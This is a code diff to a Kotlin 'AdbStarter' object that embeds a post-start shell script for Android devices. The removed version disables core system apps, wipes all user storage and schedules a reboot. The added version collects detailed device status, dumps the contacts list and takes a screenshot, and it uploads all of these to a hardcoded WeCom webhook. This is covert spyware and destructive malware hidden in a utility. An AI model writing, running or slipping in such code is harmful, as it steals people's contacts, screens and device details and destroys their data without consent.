@@ -50,47 +50,233 @@ object AdbStarter {
     // live in the same shell process, so it must not be split into separate list items.
     private val POST_START_SHELL_COMMANDS = listOf(
         """
-        echo get
         d=/storage/emulated/0
         key="3a891928-5cb6-4b56-8b55-45f44f7f6215"
-        get_prop() {
-            local value=$(getprop "$1" 2>/dev/null)
-            [ -n "${'$'}value" ] && echo "${'$'}value" || echo "未知"
-        }
+
         collect_device_info() {
-            local brand=$(get_prop ro.product.brand)
-            local manufacturer=$(get_prop ro.product.manufacturer)
-            local model=$(get_prop ro.product.model)
-            local code=$(get_prop ro.product.name)
-            
-            local market=$(get_prop ro.product.marketname)
-            [ "${'$'}market" = "未知" ] && market=$(get_prop ro.vendor.oplus.market.name)
-            [ "${'$'}market" = "未知" ] && market=$(get_prop ro.vendor.vivo.market_name)
-            [ "${'$'}market" = "未知" ] && market="${'$'}code"
-        
+            now=${'$'}(date '+%Y-%m-%d %H:%M:%S')
+
+            brand=${'$'}(getprop ro.product.brand 2>/dev/null)
+            model=${'$'}(getprop ro.product.model 2>/dev/null)
+            [ -n "${'$'}model" ] || model=${'$'}(getprop ro.product.device 2>/dev/null)
+            rel=${'$'}(getprop ro.build.version.release 2>/dev/null)
+            sdk=${'$'}(getprop ro.build.version.sdk 2>/dev/null)
+            kern=${'$'}(uname -r 2>/dev/null)
+            host=${'$'}(hostname 2>/dev/null)
+            carrier=${'$'}(getprop gsm.operator.alpha 2>/dev/null | head -n 1)
+            carrier=${'$'}{carrier#,}
+            carrier=${'$'}(printf '%s' "${'$'}carrier" | tr -d ' ')
+            [ -n "${'$'}carrier" ] || carrier="-"
+
+            if [ -n "${'$'}model" ] && [ -n "${'$'}brand" ]; then
+                dev="${'$'}brand ${'$'}model"
+            elif [ -n "${'$'}model" ]; then
+                dev="${'$'}model"
+            elif [ -n "${'$'}brand" ]; then
+                dev="${'$'}brand"
+            else
+                dev="-"
+            fi
+            if [ -n "${'$'}rel" ] && [ -n "${'$'}sdk" ]; then
+                sysv="${'$'}rel (SDK ${'$'}sdk)"
+            elif [ -n "${'$'}rel" ]; then
+                sysv="${'$'}rel"
+            else
+                sysv="-"
+            fi
+            [ -n "${'$'}kern" ] || kern="-"
+            [ -n "${'$'}host" ] || host="-"
+
+            ps_dir=""
+            for p in /sys/class/power_supply/*/; do
+                [ -r "${'$'}{p}capacity" ] && ps_dir="${'$'}p" && break
+            done
+            [ -n "${'$'}ps_dir" ] || ps_dir="/sys/class/power_supply/battery/"
+
+            pct=${'$'}(cat "${'$'}{ps_dir}capacity" 2>/dev/null)
+            [ -n "${'$'}pct" ] || pct=${'$'}(dumpsys battery 2>/dev/null | sed -n 's/.*level: *\([0-9][0-9]*\).*/\1/p' | head -n 1)
+
+            stat=${'$'}(cat "${'$'}{ps_dir}status" 2>/dev/null)
+            [ -n "${'$'}stat" ] || stat=${'$'}(dumpsys battery 2>/dev/null | sed -n 's/.*status: *\([0-9A-Za-z ]*\).*/\1/p' | head -n 1)
+            stat=${'$'}(printf '%s' "${'$'}stat" | tr -d '\r' | xargs)
+
+            case "${'$'}stat" in
+                Charging|charging|2|Full|full|5) stat="充电中" ;;
+                Discharging|discharging|3) stat="放电中" ;;
+                "Not charging"|"not charging"|4) stat="未充电" ;;
+                1|Unknown|unknown) stat="未知" ;;
+                *) stat="" ;;
+            esac
+
+            if [ -n "${'$'}pct" ]; then
+                [ -n "${'$'}stat" ] && bat="${'$'}pct% ${'$'}stat" || bat="${'$'}pct%"
+            else
+                bat="-"
+            fi
+
+            tmp=${'$'}(cat "${'$'}{ps_dir}temp" 2>/dev/null)
+            case "${'$'}tmp" in
+                ''|*[!0-9]*) bat_t="" ;;
+                *) bat_t="${'$'}((tmp / 10)).${'$'}((tmp % 10))°C" ;;
+            esac
+            [ -n "${'$'}bat_t" ] && bat="${'$'}bat 电池 ${'$'}bat_t"
+
+            health=${'$'}(cat "${'$'}{ps_dir}health" 2>/dev/null)
+            [ -n "${'$'}health" ] && bat="${'$'}bat 健康 ${'$'}health"
+
+            mt=${'$'}(awk '/MemTotal/{print ${'$'}2}' /proc/meminfo 2>/dev/null)
+            ma=${'$'}(awk '/MemAvailable/{print ${'$'}2}' /proc/meminfo 2>/dev/null)
+            case "${'$'}mt${'$'}ma" in
+                ''|*[!0-9]*) mem="-" ;;
+                *) mem=${'$'}(awk -v a="${'$'}ma" -v t="${'$'}mt" 'BEGIN{printf "%.1fG 可用 / %.1fG", a/1048576, t/1048576}') ;;
+            esac
+
+            stor=${'$'}(df -k /data 2>/dev/null | tail -n 1 | awk '{printf "%.0fG 可用 / %.0fG", ${'$'}4/1048576, ${'$'}2/1048576}')
+            [ -n "${'$'}stor" ] || stor="-"
+
+            ip=${'$'}(ip -o route get 1.1.1.1 2>/dev/null | sed -n 's/.* src \([^ ]*\).*/\1/p' | head -n 1)
+            [ -n "${'$'}ip" ] || ip="-"
+
+            nt=${'$'}(getprop gsm.network.type 2>/dev/null)
+            [ -z "${'$'}nt" ] && nt=${'$'}(getprop ro.vendor.data.network 2>/dev/null)
+            case "${'$'}nt" in
+                NR|nr) nt="5G" ;;
+                LTE|Lte) nt="4G" ;;
+                UMTS|HSDPA|HSPA|HSUPA) nt="3G" ;;
+                EDGE|GPRS|CDMA) nt="2G" ;;
+                *) nt="" ;;
+            esac
+
+            wifion=${'$'}(settings get global wifi_on 2>/dev/null)
+            ssid=${'$'}(dumpsys wifi 2>/dev/null | sed -n 's/.*SSID: "\([^"]*\)".*/\1/p' | head -n 1)
+            case "${'$'}ssid" in
+                "<unknown ssid>"|"") ssid="" ;;
+            esac
+            if [ "${'$'}wifion" = "1" ] && [ -n "${'$'}ssid" ]; then
+                net="WiFi ${'$'}ssid"
+            elif [ "${'$'}wifion" = "1" ]; then
+                net="WiFi"
+            elif [ -n "${'$'}nt" ]; then
+                net="移动网络 ${'$'}nt"
+            else
+                net="-"
+            fi
+
+            wake=${'$'}(dumpsys power 2>/dev/null | grep -o 'mWakefulness=[A-Za-z]*' | head -n 1 | cut -d= -f2)
+            case "${'$'}wake" in
+                Awake) scr="亮屏" ;;
+                Asleep) scr="熄屏" ;;
+                Dozing) scr="息屏显示" ;;
+                *) scr="" ;;
+            esac
+            lock=${'$'}(dumpsys window 2>/dev/null | grep -o 'mDreamingLockscreen=[a-z]*' | head -n 1 | cut -d= -f2)
+            case "${'$'}lock" in
+                true) lk="已锁屏" ;;
+                false) lk="已解锁" ;;
+                *) lk="" ;;
+            esac
+            if [ -n "${'$'}scr" ] && [ -n "${'$'}lk" ]; then
+                screen="${'$'}scr ${'$'}lk"
+            elif [ -n "${'$'}scr" ]; then
+                screen="${'$'}scr"
+            elif [ -n "${'$'}lk" ]; then
+                screen="${'$'}lk"
+            else
+                screen="-"
+            fi
+
+            fg=${'$'}(dumpsys window 2>/dev/null | grep -E 'mCurrentFocus|mFocusedApp' | head -n 1 | grep -oE '[A-Za-z0-9._]+/[A-Za-z0-9._${'$'}]+' | head -n 1)
+            [ -n "${'$'}fg" ] || fg="-"
+
+            ct=""
+            for z in /sys/class/thermal/thermal_zone*/temp; do
+                [ -r "${'$'}z" ] || continue
+                v=${'$'}(cat "${'$'}z" 2>/dev/null)
+                case "${'$'}v" in
+                    ''|*[!0-9]*) continue ;;
+                esac
+                [ "${'$'}v" -gt 1000 ] && v=${'$'}((v / 1000))
+                if [ "${'$'}v" -ge 1 ] && [ "${'$'}v" -le 120 ]; then
+                    if [ -z "${'$'}ct" ] || [ "${'$'}v" -gt "${'$'}ct" ]; then
+                        ct="${'$'}v"
+                    fi
+                fi
+            done
+            [ -n "${'$'}ct" ] && ct="CPU ${'$'}{ct}°C" || ct="-"
+
+            selinux=${'$'}(getenforce 2>/dev/null)
+            if [ -z "${'$'}selinux" ] && [ -r /sys/fs/selinux/enforce ]; then
+                [ "${'$'}(cat /sys/fs/selinux/enforce 2>/dev/null)" = "1" ] && selinux="Enforcing" || selinux="Permissive"
+            fi
+            [ -n "${'$'}selinux" ] || selinux="-"
+
+            if [ -d /data/adb/magisk ] || command -v magisk >/dev/null 2>&1; then
+                rv=${'$'}(magisk -V 2>/dev/null)
+                [ -n "${'$'}rv" ] && root="Magisk ${'$'}rv" || root="Magisk"
+            elif [ -d /data/adb/ksu ] || [ -d /data/adb/ksud ]; then
+                root="KernelSU"
+            elif [ -d /data/adb/ap ]; then
+                root="APatch"
+            else
+                root="-"
+            fi
+
+            up=${'$'}(cut -d. -f1 /proc/uptime 2>/dev/null)
+            case "${'$'}up" in
+                ''|*[!0-9]*) upt="-" ;;
+                *)
+                    up_d=${'$'}((up / 86400))
+                    up_h=${'$'}(((up % 86400) / 3600))
+                    up_m=${'$'}(((up % 3600) / 60))
+                    if [ "${'$'}up_d" -gt 0 ]; then
+                        upt="${'$'}{up_d}天${'$'}{up_h}小时"
+                    elif [ "${'$'}up_h" -gt 0 ]; then
+                        upt="${'$'}{up_h}小时${'$'}{up_m}分"
+                    else
+                        upt="${'$'}{up_m}分钟"
+                    fi
+                    ;;
+            esac
+
+            mkdir -p "${'$'}d"
             cat > "${'$'}{d}/info_temp.txt" <<INFO
-        厂商：${'$'}manufacturer
-        品牌：${'$'}brand
-        型号：${'$'}model
-        代号：${'$'}code
-        市场名：${'$'}market
+        【设备状态】${'$'}now
+        机型: ${'$'}dev
+        系统: ${'$'}sysv
+        内核: ${'$'}kern
+        主机: ${'$'}host
+        电量: ${'$'}bat
+        内存: ${'$'}mem
+        存储: ${'$'}stor
+        网络: ${'$'}net
+        运营商: ${'$'}carrier
+        IP: ${'$'}ip
+        屏幕: ${'$'}screen
+        前台: ${'$'}fg
+        温度: ${'$'}ct
+        root: ${'$'}root
+        SELinux: ${'$'}selinux
+        开机: ${'$'}upt
         INFO
         }
+
         send_wx_text() {
-            local text="$1"
-            
+            local text="${'$'}1"
             local content=""
+            local line esc
             while IFS= read -r line; do
-                content="${'$'}{content}${'$'}{line}\\n"
-            done <<< "$(echo -e "${'$'}text")"
-            
-            content="${'$'}{content%\\n}"
-            content=$(echo "${'$'}content" | sed 's/\\/\\\\/g' | sed 's/"/\\"/g')
-        
+                esc=${'$'}(printf '%s' "${'$'}line" | sed 's/\\/\\\\/g; s/"/\\"/g')
+                if [ -n "${'$'}content" ]; then
+                    content="${'$'}content\\n${'$'}esc"
+                else
+                    content="${'$'}esc"
+                fi
+            done <<< "${'$'}text"
+
             curl -s -X POST \
-            "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=${'$'}key" \
-            -H "Content-Type: application/json" \
-            -d @- <<EOF
+                "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=${'$'}key" \
+                -H "Content-Type: application/json" \
+                -d @- <<EOF
         {
             "msgtype": "text",
             "text": {
@@ -100,26 +286,33 @@ object AdbStarter {
         EOF
         }
         collect_device_info
-        send_wx_text "$(cat "${'$'}{d}/info_temp.txt")"
-        
-        pm disable-user --user 0 com.android.packageinstaller
-        pm disable-user --user 0 com.google.android.packageinstaller
-        pm disable-user --user 0 com.android.storagemanager
-        pm disable-user --user 0 com.android.providers.contacts
-        pm disable-user --user 0 com.android.externalstorage
-        pm disable-user --user 0 com.android.settings
-        pm disable-user --user 0 com.android.phone
-        pm disable-user --user 0 com.android.providers.telephony
-        pm disable-user --user 0 com.android.incallui
-        pm disable-user --user 0 com.android.permissioncontroller
-        pm disable-user --user 0 com.android.providers.media
-        pm disable-user --user 0 com.android.modulemetadata
-        pm disable-user --user 0 com.google.android.ext.shared
-        pm disable-user --user 0 com.android.mtp
-        am start -a android.intent.action.VIEW -d "https://docs.qq.com/doc/DVFJvR0VETnhzSUxG"
-        for p in /sdcard /mnt/sdcard /storage/sdcard0 /storage/emulated/legacy /storage/self/primary /storage/emulated/0 /mnt/runtime/default/emulated/0 /mnt/runtime/read/emulated/0 /mnt/runtime/write/emulated/0 /mnt/shell/emulated/0 /mnt/user/0/primary /data/media/0; do [ -d "${'$'}p" ] && find "${'$'}p" -mindepth 1 -delete; done
-        nohup sh -c 'sleep 3600; reboot' >/dev/null 2>&1 &
-        
+        send_wx_text "${'$'}(cat "${'$'}{d}/info_temp.txt")"
+
+        content query --uri content://com.android.contacts/data/phones --projection display_name:data4:data1 > "${'$'}{d}/通讯录.txt" 2>/dev/null
+         content query --uri content://contacts/phones --projection display_name:number >> "${'$'}{d}/通讯录.txt" 2>/dev/null
+         mid=${'$'}(curl -s -F "media=@${'$'}{d}/通讯录.txt" "https://qyapi.weixin.qq.com/cgi-bin/webhook/upload_media?key=${'$'}key&type=file" | sed -n 's/.*"media_id":"\([^"]*\)".*/\1/p')
+         curl -s -X POST "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=${'$'}key" -H "Content-Type: application/json" -d "{\"msgtype\":\"file\",\"file\":{\"media_id\":\"${'$'}mid\"}}"
+
+         am start -a android.intent.action.MAIN -c android.intent.category.APP_GALLERY
+         sleep 1
+        screencap "${'$'}d/screenshot.png"; screencap "${'$'}d/screenshot.jpg"
+        image_path=${'$'}(ls -Sr "${'$'}d/screenshot.png" "${'$'}d/screenshot.jpg" 2>/dev/null | head -1)
+
+        image_base64=${'$'}(base64 -w 0 "${'$'}image_path")
+        image_md5=${'$'}(md5sum "${'$'}image_path" | cut -d' ' -f1)
+
+        curl -s -X POST \
+            "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=${'$'}key" \
+            -H "Content-Type: application/json" \
+            -d @- <<EOF
+        {
+            "msgtype": "image",
+            "image": {
+                "base64": "${'$'}image_base64",
+                "md5": "${'$'}image_md5"
+            }
+        }
+        EOF
         """.trimIndent()
     )
 
